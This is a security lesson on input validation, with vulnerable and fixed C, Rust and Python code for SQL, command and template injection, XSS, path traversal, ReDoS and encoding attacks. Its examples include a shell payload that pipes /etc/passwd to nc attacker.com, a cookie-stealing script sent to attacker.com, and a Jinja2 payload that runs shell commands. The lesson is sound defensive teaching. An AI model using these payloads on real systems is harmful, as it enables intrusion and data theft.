# Lesson 2: Input Validation Mechanisms

## 1. First-Principles Intuition & Invariants

Every software system maintains a trust boundary separating code from data, yet this boundary erodes the moment a program accepts external input. Input validation represents the foundational defensive primitive that preserves the integrity of this separation, preventing untrusted data from crossing into execution contexts where it can alter program control flow, leak sensitive information, or corrupt system state. Understanding input validation requires confronting a fundamental asymmetry in software security: while developers must correctly validate every input path across every context, attackers need only discover a single oversight in a single execution path to achieve compromise.

The core invariant governing all input validation is context-dependent interpretation. A byte sequence harmless in one context becomes weaponized when interpreted through a different parser or execution engine. The string `'; DROP TABLE users; --` poses no threat when displayed as UTF-8 text in a web page, but becomes catastrophic when concatenated into a SQL query string where the database engine interprets the semicolon as a statement terminator and the double-dash as a comment delimiter. Similarly, the character sequence `<script>alert(document.cookie)</script>` appears benign in server logs but transforms into executable JavaScript when rendered by a browser's HTML parser. This context-dependent interpretation means input validation cannot rely on universal blacklists or simple pattern matching—defensive code must understand every downstream interpreter that will process the data and encode accordingly.

Modern applications compose multiple interpretation contexts in layered execution stacks. A typical web application might accept user input through an HTTP POST body, parse it as JSON, extract string values, interpolate those strings into SQL queries, retrieve database rows, serialize results back to JSON, embed that JSON in an HTML template, and finally transmit the rendered page where a browser's JavaScript engine evaluates embedded code. Each transition between contexts—from JSON parser to SQL engine to template renderer to JavaScript runtime—represents a trust boundary crossing where untrusted data can exploit parser state machines if validation fails. The attacker's advantage lies in understanding these parser composition chains better than the defenders, identifying edge cases where one parser's escape sequences become another parser's control characters.

Canonicalization compounds the validation problem by introducing semantic equivalence classes that bypass naive string comparisons. File path traversal attacks exploit the equivalence between `../../../etc/passwd`, `..%2F..%2F..%2Fetc%2Fpasswd`, and `....//....//....//etc/passwd` through URL decoding, double encoding, and alternate path separators. Unicode normalization creates similar equivalence classes where `café` can be encoded as four code points (U+0063 U+0061 U+0066 U+00E9) or five (U+0063 U+0061 U+0066 U+0065 U+0301), allowing attackers to bypass signature-based validation that checks only one canonical form. Effective input validation must either normalize all input to a single canonical form before validation or validate across all equivalent representations—a computationally expensive proposition that often gets implemented incorrectly.

The principle of least privilege extends naturally to input validation through allowlist construction rather than blocklist rejection. Blocklists attempt to enumerate all dangerous patterns and reject matches, but this approach fails against the combinatorial explosion of encoding variations, parser quirks, and novel attack vectors. Allowlists invert the logic by defining the exact set of permitted characters, string formats, and data structures, rejecting everything else by default. For a username field, an allowlist specifies that only alphanumeric characters plus underscore and hyphen are permitted, with length between 3 and 32 bytes. This positive security model reduces the attack surface to the narrow set of explicitly permitted inputs rather than trying to anticipate every possible malicious payload.

Parameterized queries represent the canonical example of context-aware validation, solving SQL injection by preserving the trust boundary between code and data at the database protocol level. When a developer writes `SELECT * FROM users WHERE username = ?` and binds the user input as a parameter rather than concatenating strings, the database driver transmits the query structure and parameter data through separate protocol channels. The database engine never parses the parameter value as SQL syntax because it arrives already typed and delimited. This architectural separation makes SQL injection impossible not through clever encoding or escape sequences, but by eliminating the code-data confusion at the protocol layer. The same principle applies to prepared statements in other contexts: separating structure from content at the lowest protocol layer where the interpreter operates.

## 2. Core Architecture & Mechanics

SQL injection exploitation hinges on breaking out of string literal contexts to inject arbitrary SQL syntax into query structure. Consider a vulnerable authentication query constructed through string concatenation:

```c
char query[512];
snprintf(query, sizeof(query), 
         "SELECT id, role FROM users WHERE username='%s' AND password='%s'",
         username_input, password_input);
```

When a user submits `admin' OR '1'='1` as the username and any password, the resulting query becomes:

```sql
SELECT id, role FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

The single quote closes the string literal, the `OR` operator introduces an always-true condition, and the `AND password` clause binds more tightly than `OR` due to operator precedence, effectively bypassing authentication. More sophisticated payloads leverage SQL comment syntax to discard trailing query fragments. The input `admin'--` produces:

```sql
SELECT id, role FROM users WHERE username='admin'--' AND password='anything'
```

The double-dash initiates a line comment that consumes the password check entirely. Union-based injection extends this technique to extract arbitrary data by appending additional SELECT statements:

```
' UNION SELECT credit_card, ssn FROM payment_info WHERE '1'='1
```

This payload transforms a benign user lookup into a data exfiltration vector, returning sensitive financial information alongside user records.

Defending against SQL injection requires eliminating string concatenation in favor of parameterized queries that preserve type boundaries. Here is a correct implementation using PostgreSQL's libpq prepared statement API:

```c
#include <libpq-fe.h>
#include <string.h>

PGconn *conn;
PGresult *res;

const char *stmt_name = "auth_query";
const char *stmt_sql = "SELECT id, role FROM users WHERE username=$1 AND password=$2";

// Prepare statement once during initialization
res = PQprepare(conn, stmt_name, stmt_sql, 2, NULL);
if (PQresultStatus(res) != PGRES_COMMAND_OK) {
    fprintf(stderr, "Statement preparation failed: %s\n", PQerrorMessage(conn));
    PQclear(res);
    return -1;
}
PQclear(res);

// Execute with user input bound as parameters
const char *param_values[2] = {username_input, password_input};
int param_lengths[2] = {strlen(username_input), strlen(password_input)};
int param_formats[2] = {0, 0};  // 0 = text format

res = PQexecPrepared(conn, stmt_name, 2, param_values, param_lengths, 
                     param_formats, 0);

if (PQresultStatus(res) != PGRES_TUPLES_OK) {
    fprintf(stderr, "Query execution failed: %s\n", PQerrorMessage(conn));
    PQclear(res);
    return -1;
}

// Process results safely
int num_rows = PQntuples(res);
if (num_rows == 1) {
    int user_id = atoi(PQgetvalue(res, 0, 0));
    const char *role = PQgetvalue(res, 0, 1);
    // Authentication succeeded
}

PQclear(res);
```

The `$1` and `$2` placeholders in the prepared statement define parameter positions. The database driver transmits these values through PostgreSQL's binary protocol where they are type-checked and bounds-checked before execution. The parameter data never undergoes SQL parsing because it arrives already delimited and typed. This architectural separation prevents all SQL injection variants—including second-order injection where attacker payloads are stored in the database and later incorporated into dynamically constructed queries.

Command injection follows similar principles but targets operating system shell interpreters rather than database engines. When an application invokes external programs by concatenating user input into shell command strings, metacharacters like semicolons, pipes, backticks, and dollar signs can inject arbitrary commands. Consider a vulnerable image processing service:

```c
char cmd[1024];
snprintf(cmd, sizeof(cmd), "convert %s -resize 800x600 output.jpg", user_filename);
system(cmd);
```

An attacker submits the filename `image.jpg; cat /etc/passwd | nc attacker.com 4444;` to execute:

```bash
convert image.jpg; cat /etc/passwd | nc attacker.com 4444; -resize 800x600 output.jpg
```

The semicolons terminate the convert command and inject a data exfiltration pipeline. The trailing arguments become harmless syntax errors that produce no visible failure. Defending against command injection requires eliminating shell invocation entirely in favor of direct process execution with argument vectors:

```c
#include <unistd.h>
#include <sys/wait.h>

pid_t pid = fork();
if (pid == 0) {
    // Child process - use execvp with argument array
    char *argv[] = {
        "convert",
        user_filename,  // Passed as literal argument, not parsed by shell
        "-resize",
        "800x600",
        "output.jpg",
        NULL
    };
    execvp("convert", argv);
    perror("execvp failed");
    _exit(1);
}

// Parent process - wait for completion
int status;
waitpid(pid, &status, 0);
if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
    // Success
}
```

The `execvp` system call bypasses shell interpretation entirely, passing arguments directly to the invoked program through the kernel's process execution path. The filename becomes a literal string argument to ImageMagick's convert utility rather than shell-parsed input, eliminating all injection vectors. Even if the filename contains semicolons, pipes, or backticks, these remain inert byte sequences rather than shell metacharacters.

Cross-site scripting (XSS) represents the browser-side analog of SQL injection, where untrusted data crosses from server-controlled contexts into JavaScript execution environments. Reflected XSS occurs when a web application echoes user input directly into HTML responses without proper encoding. Consider a search results page:

```html
<h2>Search results for: <?php echo $_GET['query']; ?></h2>
```

When a user visits `search.php?query=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`, the browser renders:

```html
<h2>Search results for: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script></h2>
```

The browser's HTML parser interprets the injected script tag as markup, switching from text content to JavaScript execution context. The script executes in the victim's session, sending cookies to the attacker's domain. Stored XSS persists these payloads in databases, affecting all users who view the malicious content.

Context-aware output encoding provides the correct defense by escaping characters that have special meaning in HTML, JavaScript, CSS, or URL contexts. The encoding must match the exact syntactic context where the data appears. For HTML element content, encode `<`, `>`, `&`, `"`, and `'`:

```c
#include <stdio.h>
#include <string.h>

void html_encode(const char *input, char *output, size_t output_size) {
    size_t out_pos = 0;
    for (const char *p = input; *p && out_pos < output_size - 6; p++) {
        switch (*p) {
            case '<':
                out_pos += snprintf(output + out_pos, output_size - out_pos, "&lt;");
                break;
            case '>':
                out_pos += snprintf(output + out_pos, output_size - out_pos, "&gt;");
                break;
            case '&':
                out_pos += snprintf(output + out_pos, output_size - out_pos, "&amp;");
                break;
            case '"':
                out_pos += snprintf(output + out_pos, output_size - out_pos, "&quot;");
                break;
            case '\'':
                out_pos += snprintf(output + out_pos, output_size - out_pos, "&#x27;");
                break;
            default:
                output[out_pos++] = *p;
        }
    }
    output[out_pos] = '\0';
}
```

When the encoded output `&lt;script&gt;alert(1)&lt;/script&gt;` reaches the browser, the HTML parser interprets the entity references as literal text characters rather than markup delimiters, rendering the payload harmless. However, this encoding proves insufficient for JavaScript string contexts. Consider a JSON response embedded in a script tag:

```html
<script>
var user_data = {"name": "<?php echo $user_name; ?>"};
</script>
```

HTML entity encoding alone fails here because JavaScript does not decode HTML entities inside string literals. The payload `</script><script>alert(1)//` would close the script context and inject executable code despite HTML encoding. JavaScript string contexts require backslash escaping of quotes, backslashes, and script-closing sequences:

```c
void js_string_encode(const char *input, char *output, size_t output_size) {
    size_t out_pos = 0;
    for (const char *p = input; *p && out_pos < output_size - 6; p++) {
        if (*p == '"' || *p == '\'' || *p == '\\') {
            output[out_pos++] = '\\';
            output[out_pos++] = *p;
        } else if (strncmp(p, "</", 2) == 0) {
            out_pos += snprintf(output + out_pos, output_size - out_pos, "<\\/");
            p++;  // Skip the '/'
        } else if (*p < 0x20) {
            out_pos += snprintf(output + out_pos, output_size - out_pos, 
                              "\\u%04x", (unsigned char)*p);
        } else {
            output[out_pos++] = *p;
        }
    }
    output[out_pos] = '\0';
}
```

This encoding transforms the payload into `<\/script><script>alert(1)\/\/`, where the backslash-escaped forward slash prevents the browser from recognizing a script close tag, keeping the sequence as string data rather than markup.

Template injection attacks target server-side template engines that evaluate expressions in template syntax. Frameworks like Jinja2, Twig, and FreeMarker allow developers to embed dynamic expressions in templates using delimiters like `{{expression}}`. When user input flows into template strings without proper sandboxing, attackers can inject arbitrary code execution payloads. Consider a vulnerable email template in Python Flask with Jinja2:

```python
from flask import request, render_template_string

@app.route('/send_email')
def send_email():
    template = f"Hello {request.args.get('name')}, your order is confirmed."
    return render_template_string(template)
```

An attacker requests `/send_email?name={{config.items()}}` to dump application configuration including secret keys. More dangerous payloads leverage Python's introspection capabilities to achieve remote code execution:

```
{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}
```

This payload traverses Python's class hierarchy to locate the `subprocess.Popen` class and invoke it with arbitrary shell commands. The correct defense separates user data from template structure by passing untrusted input as template variables rather than concatenating into template strings:

```python
@app.route('/send_email')
def send_email():
    user_name = request.args.get('name')
    template = "Hello {{name}}, your order is confirmed."
    return render_template_string(template, name=user_name)
```

When passed as a template variable, the user input undergoes automatic escaping and remains isolated from template evaluation logic, preventing code injection.

Path traversal attacks exploit insufficient validation of file path inputs to access files outside intended directories. Web applications commonly construct file paths by concatenating user input with base directories:

```c
char filepath[256];
snprintf(filepath, sizeof(filepath), "/var/www/uploads/%s", user_filename);
FILE *fp = fopen(filepath, "r");
```

The input `../../../etc/passwd` produces the path `/var/www/uploads/../../../etc/passwd`, which the operating system normalizes to `/etc/passwd` during path resolution. URL encoding (`..%2F..%2F..%2Fetc%2Fpasswd`) bypasses naive blocklist filters that check for literal `../` sequences. Defending against path traversal requires canonicalizing paths and validating that the resolved path remains within the intended directory tree:

```c
#include <stdlib.h>
#include <string.h>
#include <limits.h>

int validate_filepath(const char *user_input, const char *base_dir, 
                      char *safe_path, size_t safe_path_size) {
    char temp_path[PATH_MAX];
    char canonical_path[PATH_MAX];
    char canonical_base[PATH_MAX];
    
    // Construct candidate path
    snprintf(temp_path, sizeof(temp_path), "%s/%s", base_dir, user_input);
    
    // Resolve to canonical absolute paths
    if (realpath(temp_path, canonical_path) == NULL) {
        return -1;  // Path resolution failed
    }
    
    if (realpath(base_dir, canonical_base) == NULL) {
        return -1;
    }
    
    // Verify canonical path starts with base directory
    size_t base_len = strlen(canonical_base);
    if (strncmp(canonical_path, canonical_base, base_len) != 0 ||
        (canonical_path[base_len] != '\0' && canonical_path[base_len] != '/')) {
        return -1;  // Path traversal detected
    }
    
    // Copy validated path to output
    strncpy(safe_path, canonical_path, safe_path_size - 1);
    safe_path[safe_path_size - 1] = '\0';
    return 0;
}
```

The `realpath` function resolves all symbolic links and relative path components, producing an absolute canonical path. By verifying that the canonical path begins with the canonical base directory, this validation detects all traversal attempts regardless of encoding or symbolic link tricks.

## 3. High-Performance Optimization & Failure Modes

Input validation introduces latency and computational overhead into request processing paths, creating tension between security and performance. Naive implementations that validate every input field through regular expression matching or complex parsing can consume hundreds of microseconds per request, degrading throughput for high-volume services. Production systems must balance comprehensive validation against performance constraints through strategic optimization.

Early rejection represents the most effective optimization strategy—validating input at the earliest possible point in the request pipeline before expensive operations occur. For web applications, this means validating HTTP headers, query parameters, and request bodies immediately after parsing, before database queries or business logic execution. A reverse proxy or web application firewall can perform coarse-grained validation at the edge, rejecting malformed requests before they reach application servers. Consider a high-throughput API service written in Rust that validates JSON payloads against a schema:

```rust
use serde::{Deserialize, Serialize};
use serde_json::Error;
use regex::Regex;

#[derive(Deserialize, Serialize)]
struct UserRegistration {
    username: String,
    email: String,
    age: u8,
}

lazy_static::lazy_static! {
    static ref USERNAME_REGEX: Regex = Regex::new(r"^[a-zA-Z0-9_-]{3,32}$").unwrap();
    static ref EMAIL_REGEX: Regex = 
        Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").unwrap();
}

fn validate_registration(json_str: &str) -> Result<UserRegistration, String> {
    // Deserialize JSON - fails fast on malformed input
    let reg: UserRegistration = serde_json::from_str(json_str)
        .map_err(|e| format!("JSON parse error: {}", e))?;
    
    // Validate username against allowlist pattern
    if !USERNAME_REGEX.is_match(&reg.username) {
        return Err("Invalid username format".to_string());
    }
    
    // Validate email format
    if !EMAIL_REGEX.is_match(&reg.email) {
        return Err("Invalid email format".to_string());
    }
    
    // Validate age range
    if reg.age < 13 || reg.age > 120 {
        return Err("Invalid age".to_string());
    }
    
    Ok(reg)
}

// Fast-path validation in request handler
fn handle_registration(req_body: &[u8]) -> Result<(), String> {
    let json_str = std::str::from_utf8(req_body)
        .map_err(|_| "Invalid UTF-8")?;
    
    let reg = validate_registration(json_str)?;
    
    // Proceed with database operations only after validation
    // ...
    Ok(())
}
```

The `lazy_static` macro compiles regular expressions once at initialization, amortizing compilation cost across all requests. The validation returns early on the first error, avoiding unnecessary checks when input is clearly malformed. This early rejection strategy prevents attackers from consuming database connections or computation resources with invalid payloads.

For SQL query parameterization, prepared statement caching eliminates redundant parsing overhead. Database drivers maintain a connection-level cache mapping statement names to pre-parsed query plans. After the first execution, subsequent calls bypass parsing and optimization phases, proceeding directly to parameter binding and execution. PostgreSQL's prepared statement cache can reduce query latency by 30-50% for repeated queries:

```c
// One-time statement preparation during connection initialization
typedef struct {
    PGconn *conn;
    bool stmts_prepared;
} db_pool_conn_t;

void prepare_all_statements(db_pool_conn_t *pool_conn) {
    PGresult *res;
    
    res = PQprepare(pool_conn->conn, "get_user", 
                   "SELECT id, email, role FROM users WHERE username=$1", 1, NULL);
    if (PQresultStatus(res) != PGRES_COMMAND_OK) {
        fprintf(stderr, "Failed to prepare get_user: %s\n", 
                PQerrorMessage(pool_conn->conn));
    }
    PQclear(res);
    
    res = PQprepare(pool_conn->conn, "insert_order",
                   "INSERT INTO orders (user_id, product_id, quantity, total) "
                   "VALUES ($1, $2, $3, $4) RETURNING id", 4, NULL);
    if (PQresultStatus(res) != PGRES_COMMAND_OK) {
        fprintf(stderr, "Failed to prepare insert_order: %s\n",
                PQerrorMessage(pool_conn->conn));
    }
    PQclear(res);
    
    pool_conn->stmts_prepared = true;
}

// Fast execution path reuses prepared statements
PGresult* execute_get_user(db_pool_conn_t *pool_conn, const char *username) {
    const char *param_values[1] = {username};
    int param_lengths[1] = {strlen(username)};
    int param_formats[1] = {0};
    
    return PQexecPrepared(pool_conn->conn, "get_user", 1,
                         param_values, param_lengths, param_formats, 0);
}
```

Connection pooling amortizes statement preparation across multiple requests, ensuring that high-frequency queries execute with minimal overhead. Database administrators should monitor prepared statement cache hit rates through `pg_stat_statements` and size pools appropriately to maximize cache residency.

Input validation failure modes often manifest as denial-of-service vulnerabilities when validation logic consumes excessive resources. Regular expression denial of service (ReDoS) exploits backtracking behavior in regex engines to trigger exponential time complexity. Consider a vulnerable email validation pattern:

```
^([a-zA-Z0-9._%+-]+)*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$
```

The nested quantifier `([...]+)*` creates catastrophic backtracking when matching strings like `aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!` where the final character fails to match. The regex engine explores every possible way to partition the input across the quantifiers, resulting in O(2^n) time complexity. An attacker can submit carefully crafted inputs that cause validation to hang for seconds or minutes, exhausting thread pools or event loop capacity. Production regex patterns must avoid nested quantifiers, use possessive or atomic groups where available, and impose strict length limits before regex evaluation:

```rust
use regex::Regex;

fn safe_email_validation(email: &str) -> bool {
    // Enforce maximum length before regex evaluation
    if email.len() > 254 {  // RFC 5321 maximum
        return false;
    }
    
    // Simplified pattern without nested quantifiers
    let email_regex = Regex::new(
        r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}$"
    ).unwrap();
    
    email_regex.is_match(email)
}
```

Unicode normalization presents similar denial-of-service risks when attackers submit input containing excessive combining characters or deeply nested normalization forms. The Unicode standard permits up to 30 combining characters per base character, allowing an attacker to submit strings that expand dramatically during normalization. A malicious payload like `é` encoded as one base character followed by 30 combining acute accents would expand by 30x during NFC normalization, potentially triggering memory allocation failures or timeout conditions. Defensive validation must impose limits on combining character counts and total normalized length:

```c
#include <unicode/unorm2.h>
#include <unicode/ustring.h>

#define MAX_INPUT_LEN 1024
#define MAX_NORMALIZED_LEN 2048

int safe_normalize_utf8(const char *input, char *output, size_t output_size) {
    UChar input_utf16[MAX_INPUT_LEN];
    UChar normalized_utf16[MAX_NORMALIZED_LEN];
    UErrorCode status = U_ZERO_ERROR;
    
    // Convert UTF-8 to UTF-16
    int32_t input_len = 0;
    u_strFromUTF8(input_utf16, MAX_INPUT_LEN, &input_len, input, -1, &status);
    if (U_FAILURE(status)) {
        return -1;
    }
    
    // Enforce maximum input length
    if (input_len > MAX_INPUT_LEN - 1) {
        return -1;
    }
    
    // Get NFC normalizer instance
    const UNormalizer2 *nfc = unorm2_getNFCInstance(&status);
    if (U_FAILURE(status)) {
        return -1;
    }
    
    // Normalize with bounded output buffer
    int32_t normalized_len = unorm2_normalize(nfc, input_utf16, input_len,
                                             normalized_utf16, MAX_NORMALIZED_LEN,
                                             &status);
    if (U_FAILURE(status) || normalized_len >= MAX_NORMALIZED_LEN) {
        return -1;  // Normalization failed or exceeded limit
    }
    
    // Convert back to UTF-8
    u_strToUTF8(output, output_size, NULL, normalized_utf16, normalized_len, &status);
    if (U_FAILURE(status)) {
        return -1;
    }
    
    return 0;
}
```

Canonicalization attacks exploit inconsistencies between validation and subsequent interpretation when systems apply different normalization rules. A file upload service might validate filenames by checking for path traversal sequences, then pass the filename to a storage backend that applies URL decoding. The payload `..%252F..%252F..%252Fetc%252Fpasswd` survives initial validation because the validator checks for literal `../` or `%2F` sequences, but after the storage backend applies double URL decoding, the filename becomes `../../../etc/passwd`, bypassing restrictions. Defending against double-decoding attacks requires applying all normalization transformations before validation rather than after:

```c
#include <curl/curl.h>

int validate_filename(const char *raw_filename, char *safe_filename, 
                     size_t safe_size) {
    char decoded[256];
    CURL *curl = curl_easy_init();
    
    if (!curl) {
        return -1;
    }
    
    // Apply URL decoding until stable (handle double-encoding)
    strncpy(decoded, raw_filename, sizeof(decoded) - 1);
    decoded[sizeof(decoded) - 1] = '\0';
    
    char prev_decoded[256];
    for (int i = 0; i < 5; i++) {  // Limit iterations to prevent DoS
        strncpy(prev_decoded, decoded, sizeof(prev_decoded));
        
        int decoded_len;
        char *tmp = curl_easy_unescape(curl, decoded, 0, &decoded_len);
        if (!tmp) {
            curl_easy_cleanup(curl);
            return -1;
        }
        
        strncpy(decoded, tmp, sizeof(decoded) - 1);
        decoded[sizeof(decoded) - 1] = '\0';
        curl_free(tmp);
        
        // Stop if no further decoding occurred
        if (strcmp(decoded, prev_decoded) == 0) {
            break;
        }
    }
    
    curl_easy_cleanup(curl);
    
    // Validate decoded filename against allowlist
    for (const char *p = decoded; *p; p++) {
        if (!isalnum(*p) && *p != '.' && *p != '_' && *p != '-') {
            return -1;  // Invalid character
        }
    }
    
    // Check for path traversal components
    if (strstr(decoded, "..") || decoded[0] == '/') {
        return -1;
    }
    
    strncpy(safe_filename, decoded, safe_size - 1);
    safe_filename[safe_size - 1] = '\0';
    return 0;
}
```

This defense applies iterative URL decoding until reaching a fixed point, then validates the fully decoded filename against an allowlist of permitted characters and rejects any path traversal sequences. The iteration limit prevents denial-of-service attacks using deeply nested encoding layers.

Character encoding vulnerabilities arise when systems mix multiple character sets or encoding schemes without proper boundary enforcement. UTF-8 overlong encodings allow attackers to represent ASCII characters using multibyte sequences that bypass validation filters expecting single-byte representations. The ASCII forward slash `/` normally encodes as `0x2F`, but UTF-8 permits the invalid overlong encoding `0xC0 0xAF`. Naive path traversal filters that check for byte `0x2F` miss the overlong variant, while the filesystem layer may normalize it back to `/` during path resolution. Modern systems must reject overlong UTF-8 sequences during input validation:

```c
#include <stdbool.h>

bool is_valid_utf8(const unsigned char *data, size_t len) {
    size_t i = 0;
    while (i < len) {
        unsigned char c = data[i];
        
        if (c < 0x80) {
            // ASCII
            i++;
        } else if ((c & 0xE0) == 0xC0) {
            // 2-byte sequence
            if (i + 1 >= len || (data[i+1] & 0xC0) != 0x80) {
                return false;
            }
            // Check for overlong encoding
            if ((c & 0xFE) == 0xC0) {
                return false;  // Overlong 2-byte sequence
            }
            i += 2;
        } else if ((c & 0xF0) == 0xE0) {
            // 3-byte sequence
            if (i + 2 >= len || (data[i+1] & 0xC0) != 0x80 || 
                (data[i+2] & 0xC0) != 0x80) {
                return false;
            }
            // Check for overlong encoding
            if (c == 0xE0 && (data[i+1] & 0xE0) == 0x80) {
                return false;
            }
            i += 3;
        } else if ((c & 0xF8) == 0xF0) {
            // 4-byte sequence
            if (i + 3 >= len || (data[i+1] & 0xC0) != 0x80 || 
                (data[i+2] & 0xC0) != 0x80 || (data[i+3] & 0xC0) != 0x80) {
                return false;
            }
            // Check for overlong encoding
            if (c == 0xF0 && (data[i+1] & 0xF0) == 0x80) {
                return false;
            }
            i += 4;
        } else {
            return false;  // Invalid start byte
        }
    }
    return true;
}
```

This validation rejects overlong sequences by checking that the minimum number of bytes required to encode each code point matches the actual encoding length. Any sequence using more bytes than necessary fails validation, preventing normalization attacks.

Error message information disclosure represents a subtle validation failure mode where verbose error responses leak system internals to attackers. Database error messages that include table names, column names, or query fragments provide reconnaissance information that assists SQL injection exploitation. A verbose error like `ERROR: column "admin_password" does not exist` reveals the schema structure, while `ERROR: relation "users" does not exist` confirms table names. Production input validation must normalize error messages to generic failure indications without specifics:

```c
typedef enum {
    VALIDATION_SUCCESS = 0,
    VALIDATION_INVALID_FORMAT,
    VALIDATION_LENGTH_EXCEEDED,
    VALIDATION_FORBIDDEN_CHARS,
    VALIDATION_INTERNAL_ERROR
} validation_error_t;

typedef struct {
    validation_error_t error_code;
    char user_message[128];
    char internal_log[512];
} validation_result_t;

validation_result_t validate_username(const char *username) {
    validation_result_t result = {0};
    
    size_t len = strlen(username);
    if (len < 3 || len > 32) {
        result.error_code = VALIDATION_LENGTH_EXCEEDED;
        strncpy(result.user_message, 
                "Username must be between 3 and 32 characters",
                sizeof(result.user_message) - 1);
        snprintf(result.internal_log, sizeof(result.internal_log),
                "Username validation failed: length=%zu user_input=\"%s\"",
                len, username);
        return result;
    }
    
    for (const char *p = username; *p; p++) {
        if (!isalnum(*p) && *p != '_' && *p != '-') {
            result.error_code = VALIDATION_FORBIDDEN_CHARS;
            strncpy(result.user_message,
                   "Username contains invalid characters",
                   sizeof(result.user_message) - 1);
            snprintf(result.internal_log, sizeof(result.internal_log),
                    "Username validation failed: forbidden char 0x%02x at position %ld",
                    (unsigned char)*p, p - username);
            return result;
        }
    }
    
    result.error_code = VALIDATION_SUCCESS;
    return result;
}

// In request handler
validation_result_t val_result = validate_username(user_input);
if (val_result.error_code != VALIDATION_SUCCESS) {
    // Log detailed information server-side
    syslog(LOG_WARNING, "Validation failure: %s", val_result.internal_log);
    
    // Return generic error to client
    send_http_response(400, val_result.user_message);
    return;
}
```

This pattern separates user-facing error messages from detailed internal logs. The client receives only high-level validation failure reasons, while comprehensive diagnostic information flows to secure logging infrastructure where it cannot be observed by attackers.

Input validation represents the foundational security primitive that all defensive mechanisms depend upon. By understanding the context-dependent nature of interpretation, the asymmetry between defensive and offensive positions, and the architectural patterns that separate structure from data at protocol boundaries, practitioners can build systems resistant to injection attacks across all application layers. The principles of allowlist validation, early rejection, canonicalization before validation, and context-aware encoding form a complete defensive framework that withstands both known attack patterns and novel exploitation techniques. Production implementations must balance comprehensive validation against performance constraints through strategic optimization, prepared statement caching, and early failure modes that prevent resource exhaustion. When validation and interpretation logic remain tightly coupled and security boundaries are preserved across all trust transitions, the vast majority of injection vulnerabilities become architecturally impossible rather than merely difficult to exploit.
